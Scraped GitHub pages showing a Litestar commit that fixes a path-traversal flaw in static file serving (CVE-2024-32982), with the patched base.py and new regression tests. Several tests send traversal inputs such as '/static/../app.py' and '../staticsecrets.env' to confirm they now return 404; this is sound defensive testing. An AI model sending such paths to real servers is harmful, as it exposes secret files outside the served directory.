=== Content from github.com_91b26e5e_20250111_200821.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fcommit%2F57e706e7effdc182fc9a2af5981bc88afb21851b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fcommit%2F57e706e7effdc182fc9a2af5981bc88afb21851b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=litestar-org%2Flitestar)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[litestar-org](/litestar-org)
/
**[litestar](/litestar-org/litestar)**
Public

* [Notifications](/login?return_to=%2Flitestar-org%2Flitestar) You must be signed in to change notification settings
* [Fork
  390](/login?return_to=%2Flitestar-org%2Flitestar)
* [Star
   5.8k](/login?return_to=%2Flitestar-org%2Flitestar)

* [Code](/litestar-org/litestar)
* [Issues
  178](/litestar-org/litestar/issues)
* [Pull requests
  15](/litestar-org/litestar/pulls)
* [Discussions](/litestar-org/litestar/discussions)
* [Actions](/litestar-org/litestar/actions)
* [Projects
  3](/litestar-org/litestar/projects)
* [Security](/litestar-org/litestar/security)
* [Insights](/litestar-org/litestar/pulse)

Additional navigation options

* [Code](/litestar-org/litestar)
* [Issues](/litestar-org/litestar/issues)
* [Pull requests](/litestar-org/litestar/pulls)
* [Discussions](/litestar-org/litestar/discussions)
* [Actions](/litestar-org/litestar/actions)
* [Projects](/litestar-org/litestar/projects)
* [Security](/litestar-org/litestar/security)
* [Insights](/litestar-org/litestar/pulse)

## Commit

[Permalink](/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-83pv-qr33-2vcf](https://github.com/advisories/GHSA-83pv-qr33-2vcf "GHSA-83pv-qr33-2vcf")

[Browse files](/litestar-org/litestar/tree/57e706e7effdc182fc9a2af5981bc88afb21851b)
Browse the repository at this point in the history

```
Fix for vulnerability introduced in [#739](https://github.com/litestar-org/litestar/pull/739), caused by failure to normalize the path part extracted from URL before serving data from a static directory.

See [GHSA-83pv-qr33-2vcf](https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf "GHSA-83pv-qr33-2vcf") for specific details.

Co-authored-by: Brian Edgar RÃ© <brian@192.168.1.4>
Co-authored-by: Peter Schutt <peter.github@proton.me>
```

* Loading branch information

[![@JacobCoffee](https://avatars.githubusercontent.com/u/45884264?s=40&v=4)](/JacobCoffee) [![@peterschutt](https://avatars.githubusercontent.com/u/20659309?s=40&v=4)](/peterschutt)

3 people

authored
May 6, 2024

1 parent
[ab5f45a](/litestar-org/litestar/commit/ab5f45a19056ed8383b8885ac1568a14cf4c79f5)

commit 57e706e

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**130 additions**
and
**8 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* litestar/static\_files

  + litestar/static\_files/base.py
    [base.py](#diff-458c1ab1f7d157a40d418915ba65dea880f4854f5477c3144bfc1fa83f7685f8)
* tests

  + e2e/test\_routing

    - tests/e2e/test\_routing/test\_path\_resolution.py
      [test\_path\_resolution.py](#diff-3d889f430bc50a03c5a62b8413e5cfe2d7260a2b9a6dd7eb42fd04e4a9fe347e)
  + unit/test\_static\_files

    - tests/unit/test\_static\_files/test\_file\_serving\_resolution.py
      [test\_file\_serving\_resolution.py](#diff-ba6efb3e3669c8392bfca3ef45cd6fb5cb9b669cd0b8295b558991a52e6f2874)
    - tests/unit/test\_static\_files/test\_static\_files\_validation.py
      [test\_static\_files\_validation.py](#diff-27c3fe0c877ef22af62e97950fdfc858e488e9d751658e796779877a2e5a35cf)

## There are no files selected for viewing

20 changes: 15 additions & 5 deletions

20
[litestar/static\_files/base.py](#diff-458c1ab1f7d157a40d418915ba65dea880f4854f5477c3144bfc1fa83f7685f8 "litestar/static_files/base.py")

Show comments

[View file](/litestar-org/litestar/blob/57e706e7effdc182fc9a2af5981bc88afb21851b/litestar/static_files/base.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,7 @@ |
|  |  | # ruff: noqa: PTH118 |
|  |  | from \_\_future\_\_ import annotations |
|  |  |  |
|  |  | from os.path import commonpath |
|  |  | import os.path |
|  |  | from pathlib import Path |
|  |  | from typing import TYPE\_CHECKING, Literal, Sequence |
|  |  |  |
| Expand All | | @@ -12,7 +13,6 @@ |
|  |  |  |
|  |  | \_\_all\_\_ = ("StaticFiles",) |
|  |  |  |
|  |  |  |
|  |  | if TYPE\_CHECKING: |
|  |  | from litestar.types import Receive, Scope, Send |
|  |  | from litestar.types.composite\_types import PathType |
| Expand Down  Expand Up | | @@ -45,7 +45,9 @@ def \_\_init\_\_( |
|  |  | headers: Headers that will be sent with every response. |
|  |  | """ |
|  |  | self.adapter = FileSystemAdapter(file\_system) |
|  |  | self.directories = tuple(Path(p).resolve() if resolve\_symlinks else Path(p) for p in directories) |
|  |  | self.directories = tuple( |
|  |  | os.path.normpath(Path(p).resolve() if resolve\_symlinks else Path(p)) for p in directories |
|  |  | ) |
|  |  | self.is\_html\_mode = is\_html\_mode |
|  |  | self.send\_as\_attachment = send\_as\_attachment |
|  |  | self.headers = headers |
| Expand All | | @@ -55,6 +57,12 @@ async def get\_fs\_info( |
|  |  | ) -> tuple[Path, FileInfo] | tuple[None, None]: |
|  |  | """Return the resolved path and a :class:`stat\_result <os.stat\_result>`. |
|  |  |  |
|  |  | .. versionchanged:: 2.8.3 |
|  |  |  |
|  |  | Prevent `CVE-2024-32982 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32982>`\_ |
|  |  | by ensuring that the resolved path is within the configured directory as part of `advisory |
|  |  | GHSA-83pv-qr33-2vcf <https://github.com/advisories/GHSA-83pv-qr33-2vcf>`\_. |
|  |  |  |
|  |  | Args: |
|  |  | directories: A list of directory paths. |
|  |  | file\_path: A file path to resolve |
| Expand All | | @@ -66,8 +74,10 @@ async def get\_fs\_info( |
|  |  | for directory in directories: |
|  |  | try: |
|  |  | joined\_path = Path(directory, file\_path) |
|  |  | file\_info = await self.adapter.info(joined\_path) |
|  |  | if file\_info and commonpath([str(directory), file\_info["name"], joined\_path]) == str(directory): |
|  |  | normalized\_file\_path = os.path.normpath(joined\_path) |
|  |  | if os.path.commonpath([directory, normalized\_file\_path]) == str(directory) and ( |
|  |  | file\_info := await self.adapter.info(joined\_path) |
|  |  | ): |
|  |  | return joined\_path, file\_info |
|  |  | except FileNotFoundError: |
|  |  | continue |
| Expand Down | |  |

48 changes: 48 additions & 0 deletions

48
[tests/e2e/test\_routing/test\_path\_resolution.py](#diff-3d889f430bc50a03c5a62b8413e5cfe2d7260a2b9a6dd7eb42fd04e4a9fe347e "tests/e2e/test_routing/test_path_resolution.py")

Show comments

[View file](/litestar-org/litestar/blob/57e706e7effdc182fc9a2af5981bc88afb21851b/tests/e2e/test_routing/test_path_resolution.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -360,3 +360,51 @@ async def pathfinder(path: Optional[Path]) -> str: |
|  |  |  |
|  |  | assert httpx.get("http://127.0.0.1:9999/").text == "None" |
|  |  | assert httpx.get("http://127.0.0.1:9999/something").text == "/something" |
|  |  |  |
|  |  |  |
|  |  | @pytest.mark.parametrize( |
|  |  | "server\_command", |
|  |  | [ |
|  |  | pytest.param(["uvicorn", "app:app", "--port", "9999", "--root-path", "/test"], id="uvicorn"), |
|  |  | pytest.param(["hypercorn", "app:app", "--bind", "127.0.0.1:9999", "--root-path", "/test"], id="hypercorn"), |
|  |  | pytest.param(["daphne", "app:app", "--port", "9999", "--root-path", "/test"], id="daphne"), |
|  |  | ], |
|  |  | ) |
|  |  | @pytest.mark.xdist\_group("live\_server\_test") |
|  |  | @pytest.mark.server\_integration |
|  |  | def test\_no\_path\_traversal\_from\_static\_directory( |
|  |  | tmp\_path: Path, monkeypatch: MonkeyPatch, server\_command: List[str], run\_server: Callable[[str, List[str]], None] |
|  |  | ) -> None: |
|  |  | import http.client |
|  |  |  |
|  |  | static = tmp\_path / "static" |
|  |  | static.mkdir() |
|  |  | (static / "index.html").write\_text("Hello, World!") |
|  |  |  |
|  |  | app = """ |
|  |  | from pathlib import Path |
|  |  | from litestar import Litestar |
|  |  | from litestar.static\_files import create\_static\_files\_router |
|  |  | import uvicorn |
|  |  |  |
|  |  | app = Litestar( |
|  |  | route\_handlers=[ |
|  |  | create\_static\_files\_router(path="/static", directories=["static"]), |
|  |  | ], |
|  |  | ) |
|  |  | """ |
|  |  |  |
|  |  | def send\_request(host: str, port: int, path: str) -> http.client.HTTPResponse: |
|  |  | connection = http.client.HTTPConnection(host, port) |
|  |  | connection.request("GET", path) |
|  |  | resp = connection.getresponse() |
|  |  | connection.close() |
|  |  | return resp |
|  |  |  |
|  |  | run\_server(app, server\_command) |
|  |  |  |
|  |  | response = send\_request("127.0.0.1", 9999, "/static/index.html") |
|  |  | assert response.status == 200 |
|  |  |  |
|  |  | response = send\_request("127.0.0.1", 9999, "/static/../app.py") |
|  |  | assert response.status == 404 |

30 changes: 29 additions & 1 deletion

30
[tests/unit/test\_static\_files/test\_file\_serving\_resolution.py](#diff-ba6efb3e3669c8392bfca3ef45cd6fb5cb9b669cd0b8295b558991a52e6f2874 "tests/unit/test_static_files/test_file_serving_resolution.py")

Show comments

[View file](/litestar-org/litestar/blob/57e706e7effdc182fc9a2af5981bc88afb21851b/tests/unit/test_static_files/test_file_serving_resolution.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -10,7 +10,7 @@ |
|  |  | from typing\_extensions import TypeAlias |
|  |  |  |
|  |  | from litestar import MediaType, Router, get |
|  |  | from litestar.static\_files import StaticFilesConfig, create\_static\_files\_router |
|  |  | from litestar.static\_files import StaticFiles, StaticFilesConfig, create\_static\_files\_router |
|  |  | from litestar.status\_codes import HTTP\_200\_OK |
|  |  | from litestar.testing import create\_test\_client |
|  |  | from tests.unit.test\_static\_files.conftest import MakeConfig |
| Expand Down  Expand Up | | @@ -295,3 +295,31 @@ def test\_resolve\_symlinks(tmp\_path: Path, resolve: bool) -> None: |
|  |  | assert client.get("/test.txt").status\_code == 404 |
|  |  | else: |
|  |  | assert client.get("/test.txt").status\_code == 200 |
|  |  |  |
|  |  |  |
|  |  | async def test\_staticfiles\_get\_fs\_info\_no\_access\_to\_non\_static\_directory( |
|  |  | tmp\_path: Path, |
|  |  | file\_system: FileSystemProtocol, |
|  |  | ) -> None: |
|  |  | assets = tmp\_path / "assets" |
|  |  | assets.mkdir() |
|  |  | index = tmp\_path / "index.html" |
|  |  | index.write\_text("content", "utf-8") |
|  |  | static\_files = StaticFiles(is\_html\_mode=False, directories=[assets], file\_system=file\_system) |
|  |  | path, info = await static\_files.get\_fs\_info([assets], "../index.html") |
|  |  | assert path is None |
|  |  | assert info is None |
|  |  |  |
|  |  |  |
|  |  | async def test\_staticfiles\_get\_fs\_info\_no\_access\_to\_non\_static\_file\_with\_prefix( |
|  |  | tmp\_path: Path, |
|  |  | file\_system: FileSystemProtocol, |
|  |  | ) -> None: |
|  |  | static = tmp\_path / "static" |
|  |  | static.mkdir() |
|  |  | private\_file = tmp\_path / "staticsecrets.env" |
|  |  | private\_file.write\_text("content", "utf-8") |
|  |  | static\_files = StaticFiles(is\_html\_mode=False, directories=[static], file\_system=file\_system) |
|  |  | path, info = await static\_files.get\_fs\_info([static], "../staticsecrets.env") |
|  |  | assert path is None |
|  |  | assert info is None |

40 changes: 38 additions & 2 deletions

40
[tests/unit/test\_static\_files/test\_static\_files\_validation.py](#diff-27c3fe0c877ef22af62e97950fdfc858e488e9d751658e796779877a2e5a35cf "tests/unit/test_static_files/test_static_files_validation.py")

Show comments

[View file](/litestar-org/litestar/blob/57e706e7effdc182fc9a2af5981bc88afb21851b/tests/unit/test_static_files/test_static_files_validation.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,6 @@ |
|  |  | from typing import TYPE\_CHECKING, Any, List |
|  |  | import asyncio |
|  |  | from pathlib import Path, PosixPath |
|  |  | from typing import TYPE\_CHECKING, Any, List, cast |
|  |  |  |
|  |  | import pytest |
|  |  |  |
| Expand All | | @@ -9,7 +11,7 @@ |
|  |  | from litestar.testing import create\_test\_client |
|  |  |  |
|  |  | if TYPE\_CHECKING: |
|  |  | from pathlib import Path |
|  |  | from litestar.static\_files import StaticFiles |
|  |  |  |
|  |  |  |
|  |  | @pytest.mark.parametrize("directories", [[], [""]]) |
| Expand Down  Expand Up | | @@ -113,3 +115,37 @@ def test\_runtime\_validation\_of\_request\_method\_create\_handler(tmpdir: "Path", met |
|  |  | with create\_test\_client(create\_static\_files\_router(path="/static", directories=[tmpdir])) as client: |
|  |  | response = client.request(method, "/static/test.txt") |
|  |  | assert response.status\_code == expected |
|  |  |  |
|  |  |  |
|  |  | def test\_config\_validation\_of\_path\_prevents\_directory\_traversal(tmpdir: "Path") -> None: |
|  |  | # Setup: Create a 'secret.txt' outside the static directory to simulate sensitive file |
|  |  | secret\_path = Path(tmpdir) / "../secret.txt" |
|  |  | secret\_path.write\_text("This is a secret file.", encoding="utf-8") |
|  |  |  |
|  |  | # Setup: Create 'test.txt' inside the static directory |
|  |  | test\_file\_path = Path(tmpdir) / "test.txt" |
|  |  | test\_file\_path.write\_text("This is a test file.", encoding="utf-8") |
|  |  |  |
|  |  | # Get StaticFiles handler |
|  |  | config = StaticFilesConfig(path="/static", directories=[tmpdir]) |
|  |  | asgi\_router = config.to\_static\_files\_app() |
|  |  | static\_files\_handler = cast("StaticFiles", asgi\_router.fn) |
|  |  |  |
|  |  | # Resolve file path with the StaticFiles handler |
|  |  | string\_path = Path("../secret.txt").as\_posix() |
|  |  |  |
|  |  | coroutine = static\_files\_handler.get\_fs\_info(directories=static\_files\_handler.directories, file\_path=string\_path) |
|  |  | resolved\_path, fs\_info = asyncio.run(coroutine) |
|  |  |  |
|  |  | assert resolved\_path is None # Because the resolved path is outside the static directory |
|  |  | assert fs\_info is None # Because the file doesn't exist, so there is no info |
|  |  |  |
|  |  | # Resolve file path with the StaticFiles handler |
|  |  | string\_path = Path("test.txt").as\_posix() |
|  |  |  |
|  |  | coroutine = static\_files\_handler.get\_fs\_info(directories=static\_files\_handler.directories, file\_path=string\_path) |
|  |  | resolved\_path, fs\_info = asyncio.run(coroutine) |
|  |  |  |
|  |  | expected\_resolved\_path = PosixPath(str(tmpdir / "test.txt")) |
|  |  | assert resolved\_path == expected\_resolved\_path # Because the resolved path is inside the static directory |
|  |  | assert fs\_info is not None # Because the file exists, so there is info |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `57e706e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fcommit%2F57e706e7effdc182fc9a2af5981bc88afb21851b) to comment.

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from github.com_369a0e88_20250111_200820.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fblob%2Fmain%2Flitestar%2Fstatic_files%2Fbase.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fblob%2Fmain%2Flitestar%2Fstatic_files%2Fbase.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=litestar-org%2Flitestar)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[litestar-org](/litestar-org)
/
**[litestar](/litestar-org/litestar)**
Public

* [Notifications](/login?return_to=%2Flitestar-org%2Flitestar) You must be signed in to change notification settings
* [Fork
  390](/login?return_to=%2Flitestar-org%2Flitestar)
* [Star
   5.8k](/login?return_to=%2Flitestar-org%2Flitestar)

* [Code](/litestar-org/litestar)
* [Issues
  178](/litestar-org/litestar/issues)
* [Pull requests
  15](/litestar-org/litestar/pulls)
* [Discussions](/litestar-org/litestar/discussions)
* [Actions](/litestar-org/litestar/actions)
* [Projects
  3](/litestar-org/litestar/projects)
* [Security](/litestar-org/litestar/security)
* [Insights](/litestar-org/litestar/pulse)

Additional navigation options

* [Code](/litestar-org/litestar)
* [Issues](/litestar-org/litestar/issues)
* [Pull requests](/litestar-org/litestar/pulls)
* [Discussions](/litestar-org/litestar/discussions)
* [Actions](/litestar-org/litestar/actions)
* [Projects](/litestar-org/litestar/projects)
* [Security](/litestar-org/litestar/security)
* [Insights](/litestar-org/litestar/pulse)

## Files

Â main
## Breadcrumbs

1. [litestar](/litestar-org/litestar/tree/main)
2. /[litestar](/litestar-org/litestar/tree/main/litestar)
3. /[static\_files](/litestar-org/litestar/tree/main/litestar/static_files)
/
# base.py

Copy path Blame  Blame
## Latest commit

## History

[History](/litestar-org/litestar/commits/main/litestar/static_files/base.py)151 lines (127 loc) Â· 5.99 KBÂ main
## Breadcrumbs

1. [litestar](/litestar-org/litestar/tree/main)
2. /[litestar](/litestar-org/litestar/tree/main/litestar)
3. /[static\_files](/litestar-org/litestar/tree/main/litestar/static_files)
/
# base.py

Top
## File metadata and controls

* Code
* Blame

151 lines (127 loc) Â· 5.99 KB[Raw](https://github.com/litestar-org/litestar/raw/refs/heads/main/litestar/static_files/base.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151# ruff: noqa: PTH118from \_\_future\_\_ import annotations
import os.pathfrom pathlib import Pathfrom typing import TYPE\_CHECKING, Literal, Sequence
from litestar.enums import ScopeTypefrom litestar.exceptions import MethodNotAllowedException, NotFoundExceptionfrom litestar.file\_system import FileSystemAdapterfrom litestar.response.file import ASGIFileResponsefrom litestar.status\_codes import HTTP\_404\_NOT\_FOUND
\_\_all\_\_ = ("StaticFiles",)
if TYPE\_CHECKING: from litestar.types import Receive, Scope, Send from litestar.types.composite\_types import PathType from litestar.types.file\_types import FileInfo, FileSystemProtocol
class StaticFiles: """ASGI App that handles file sending."""
 \_\_slots\_\_ = ("adapter", "directories", "headers", "is\_html\_mode", "send\_as\_attachment")
 def \_\_init\_\_( self, is\_html\_mode: bool, directories: Sequence[PathType], file\_system: FileSystemProtocol, send\_as\_attachment: bool = False, resolve\_symlinks: bool = True, headers: dict[str, str] | None = None, ) -> None: """Initialize the Application.
 Args: is\_html\_mode: Flag dictating whether serving html. If true, the default file will be ``index.html``. directories: A list of directories to serve files from. file\_system: The file\_system spec to use for serving files. send\_as\_attachment: Whether to send the file with a ``content-disposition`` header of ``attachment`` or ``inline`` resolve\_symlinks: Resolve symlinks to the directories headers: Headers that will be sent with every response. """ self.adapter = FileSystemAdapter(file\_system) self.directories = tuple( os.path.normpath(Path(p).resolve() if resolve\_symlinks else Path(p)) for p in directories ) self.is\_html\_mode = is\_html\_mode self.send\_as\_attachment = send\_as\_attachment self.headers = headers
 async def get\_fs\_info( self, directories: Sequence[PathType], file\_path: PathType ) -> tuple[Path, FileInfo] | tuple[None, None]: """Return the resolved path and a :class:`stat\_result <os.stat\_result>`.
 .. versionchanged:: 2.8.3
 Prevent `CVE-2024-32982 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32982>`\_ by ensuring that the resolved path is within the configured directory as part of `advisory GHSA-83pv-qr33-2vcf <https://github.com/advisories/GHSA-83pv-qr33-2vcf>`\_.
 Args: directories: A list of directory paths. file\_path: A file path to resolve
 Returns: A tuple with an optional resolved :class:`Path <anyio.Path>` instance and an optional :class:`stat\_result <os.stat\_result>`. """ for directory in directories: try: joined\_path = Path(directory, file\_path) normalized\_file\_path = os.path.normpath(joined\_path) if os.path.commonpath([directory, normalized\_file\_path]) == str(directory) and ( file\_info := await self.adapter.info(joined\_path) ): return joined\_path, file\_info except FileNotFoundError: continue return None, None
 async def \_\_call\_\_(self, scope: Scope, receive: Receive, send: Send) -> None: """ASGI callable.
 Args: scope: ASGI scope receive: ASGI ``receive`` callable send: ASGI ``send`` callable
 Returns: None """ if scope["type"] != ScopeType.HTTP or scope["method"] not in {"GET", "HEAD"}: raise MethodNotAllowedException()
 res = await self.handle(path=scope["path"], is\_head\_response=scope["method"] == "HEAD") await res(scope=scope, receive=receive, send=send)
 async def handle(self, path: str, is\_head\_response: bool) -> ASGIFileResponse: split\_path = path.split("/") filename = split\_path[-1] joined\_path = Path(\*split\_path) resolved\_path, fs\_info = await self.get\_fs\_info(directories=self.directories, file\_path=joined\_path) content\_disposition\_type: Literal["inline", "attachment"] = ( "attachment" if self.send\_as\_attachment else "inline" )
 if self.is\_html\_mode and fs\_info and fs\_info["type"] == "directory": filename = "index.html" resolved\_path, fs\_info = await self.get\_fs\_info( directories=self.directories, file\_path=Path(resolved\_path or joined\_path) / filename, )
 if fs\_info and fs\_info["type"] == "file": return ASGIFileResponse( file\_path=resolved\_path or joined\_path, file\_info=fs\_info, file\_system=self.adapter.file\_system, filename=filename, content\_disposition\_type=content\_disposition\_type, is\_head\_response=is\_head\_response, headers=self.headers, )
 if self.is\_html\_mode: # for some reason coverage doesn't catch these two lines filename = "404.html" # pragma: no cover resolved\_path, fs\_info = await self.get\_fs\_info( # pragma: no cover directories=self.directories, file\_path=filename )
 if fs\_info and fs\_info["type"] == "file": return ASGIFileResponse( file\_path=resolved\_path or joined\_path, file\_info=fs\_info, file\_system=self.adapter.file\_system, filename=filename, status\_code=HTTP\_404\_NOT\_FOUND, content\_disposition\_type=content\_disposition\_type, is\_head\_response=is\_head\_response, headers=self.headers, )
 raise NotFoundException( f"no file or directory match the path {resolved\_path or joined\_path} was found" ) # pragma: no cover

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.



=== Content from github.com_a69e2c8c_20250111_200821.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

